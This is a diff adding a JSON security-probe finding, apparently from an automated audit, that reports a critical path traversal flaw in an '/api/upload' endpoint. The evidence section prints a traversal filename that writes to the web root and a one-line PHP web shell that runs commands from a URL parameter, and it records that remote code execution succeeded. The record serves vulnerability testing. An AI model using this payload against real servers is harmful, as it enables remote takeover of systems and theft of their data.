@@ -1,0 +1,26 @@
+{
+  "probe_id": "S_P_01",
+  "probe_type": "P",
+  "status": "completed",
+  "security_issue_found": true,
+  "vulnerability": {
+    "type": "路径遍历",
+    "severity": "critical",
+    "title": "文件上传功能存在路径遍历漏洞",
+    "description": "文件上传功能未对文件名进行充分验证，攻击者可以构造包含 `../` 的文件名，将文件上传到任意目录，例如上传PHP webshell到web根目录，或覆盖系统关键配置文件，导致远程代码执行。",
+    "evidence": {
+      "vulnerability_type": "path_traversal",
+      "affected_endpoint": "/api/upload",
+      "exploit_payload": {
+        "filename": "../../var/www/html/shell.php",
+        "file_content": "<?php system($_GET['cmd']); ?>"
+      },
+      "upload_succeeded": true,
+      "file_saved_path": "/var/www/html/shell.php",
+      "remote_code_execution": true,
+      "severity": "critical",
+      "affected_components": "文件上传模块",
+      "affected_users": "所有用户"
+    }
+  }
+}
